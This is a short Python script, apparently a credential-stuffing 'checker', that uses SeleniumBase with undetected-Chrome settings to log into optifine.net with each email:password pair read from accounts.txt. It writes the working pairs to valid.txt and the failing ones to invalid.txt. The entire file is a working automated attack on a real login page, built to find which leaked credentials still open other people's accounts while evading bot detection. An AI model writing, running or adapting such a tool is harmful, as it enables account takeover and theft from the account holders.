import os
from seleniumbase import SB

def verify_success(sb):
    sb.wait_for_element_visible('h2', timeout=3)
    sb.sleep(1)

def login(sb, email, password):
    print(f"Logging in with {email}")
    sb.open("https://optifine.net/login")
    sb.wait_for_element_visible('input[name="email"]', timeout=5)
    sb.wait_for_element_visible('input[name="password"]', timeout=5)
    print("Filling login form")
    sb.update_text('input[name="email"]', email)
    sb.update_text('input[name="password"]', password)
    sb.click('input[name="login"]')

def classify_result(sb, email, password):
    if sb.is_element_present('h2') and "Capes" in sb.get_text('h2'):
        with open('valid.txt', 'a') as valid_file:
            valid_file.write(f"{email}:{password}\n")
        print(f"{email} Valid")
    else:
        with open('invalid.txt', 'a') as invalid_file:
            invalid_file.write(f"{email}:{password}\n")
        print(f"{email} Invalid")

def remove_processed_account(account):
    with open("accounts.txt", "r") as accounts_file:
        lines = accounts_file.readlines()
    with open("accounts.txt", "w") as accounts_file:
        for line in lines:
            if line.strip() != account:
                accounts_file.write(line)

with SB(uc_cdp=True, guest_mode=True) as sb:
    with open("accounts.txt", "r") as accounts_file:
        lines = accounts_file.readlines()
    for line in lines:
        email, password = line.strip().split(':', 1)
        try:
            login(sb, email, password)
            verify_success(sb)
            classify_result(sb, email, password)
            remove_processed_account(line.strip())
        except Exception as e:
            print(f"Error processing account {email}: {e}")
